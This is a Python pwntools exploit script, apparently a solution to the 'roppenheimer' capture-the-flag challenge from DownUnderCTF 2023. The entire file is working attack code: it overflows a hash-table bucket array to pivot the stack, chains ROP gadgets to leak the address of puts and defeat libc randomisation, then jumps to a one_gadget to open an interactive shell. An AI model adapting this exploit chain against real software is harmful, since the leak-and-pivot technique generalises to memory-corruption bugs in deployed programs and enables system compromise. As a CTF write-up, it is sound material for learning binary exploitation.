#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./roppenheimer", checksec=False)
libc = ELF("./libc.so.6")


def start(argv=[], *a, **kw):
    nc = "nc 2023.ductf.dev 30012"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


def add_atom(k, v):
    io.sendlineafter(b"choice> ", b"1")
    io.sendlineafter(b"atom> ", str(k).encode())
    io.sendlineafter(b"data> ", str(v).encode())


env = {}

pop_rsi_rbp = 0x00404944
pop_rdi_rbp = 0x004025e0
pop_rbp = 0x004025e2
ret = pop_rdi_rbp + 3
leave_ret = 0x00402848
# 0x00401d58: mov [rbp-8], rdi; mov [rbp-0x10], rsi; mov rax, [rbp-0x10];
# pop rbp; ret;
mov_gadget = 0x00402e02

main = elf.symbols["main"]

username = elf.symbols["username"]

rbp = elf.bss(0xd00)
rop_chain = flat(
    rbp,
    pop_rdi_rbp, elf.got["puts"], rbp,
    elf.plt["puts"],
    pop_rdi_rbp, main, rbp,
    pop_rsi_rbp, main, rbp,
    mov_gadget, rbp - 0x10,
    leave_ret,
)

"""
Through trial-and-error, when there are 32 atoms, the bucket size is increased
from 13 to 29, and finally to 59 buckets.
A bucket of a key is calculated as key % bucket_count()

Since the bucket size is 32 but the `elems` is only 20, there is buffer
overflow
"""

io = start()
io.sendlineafter(b"name> ", rop_chain)

# 24, 0x1c, 27 are obtained through debugging
for i in range(32):
    if i == 24:
        add_atom(username + (i - 0x1c) * 59, 2)
    elif i == 0x1c:
        add_atom(username + (i - 0x1c) * 59, leave_ret)
    elif i == 27:
        add_atom(username + (i - 0x1c) * 59, pop_rbp)
    else:
        add_atom(username + (i - 0x1c) * 59, i)

io.sendlineafter(b"choice> ", b"2")
io.sendlineafter(b"atom> ", str(username).encode())

io.recvline()
io.recvline()
io.recvline()
puts_leak = u64(io.recvline(keepends=False).ljust(8, b"\x00"))
log.info(f"{puts_leak=:#x}")

libc.address = puts_leak - libc.symbols["puts"]

pop_rdx_rbx = libc.address + 0x00090529
one_gadget = libc.address + 0xebcf8
rop_chain = flat(
    rbp,
    pop_rdx_rbx, 0, 0,
    one_gadget,
)

io.sendlineafter(b"name> ", rop_chain)

add_atom(username + 0 * 59, leave_ret)
add_atom(username + 1 * 59, pop_rbp)

for i in range(2, 32):
    add_atom(username + i * 59, i)

io.sendlineafter(b"choice> ", b"2")
pause()
io.sendlineafter(b"atom> ", str(username).encode())

io.interactive()
